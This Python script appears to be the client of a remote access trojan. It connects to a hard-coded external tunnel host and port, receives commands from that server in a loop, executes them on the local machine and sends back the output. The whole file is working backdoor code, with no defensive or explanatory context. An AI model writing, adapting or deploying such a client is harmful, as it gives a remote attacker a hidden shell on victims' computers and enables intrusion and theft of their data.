#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Import modules
import Core.server as Server
import Core.commands as Command
from os import system, name, devnull

# Change default encoding if running on windows
if name == "nt":
    system("chcp 65001 > " + devnull)

# Default server settings
SERVER_HOST = "rasep59-52984.portmap.host"
SERVER_PORT = 52984

# Connect to server
server = Server.ConnectServer(SERVER_HOST, SERVER_PORT)

command = ""
while command.lower() != "exit":
    # Receive commands from server
    command = server.Read()
    # Run command
    output = Command.Run(command, server)
    # Send command response
    server.Send(output)
    
# Close connection
server.Disconnect()
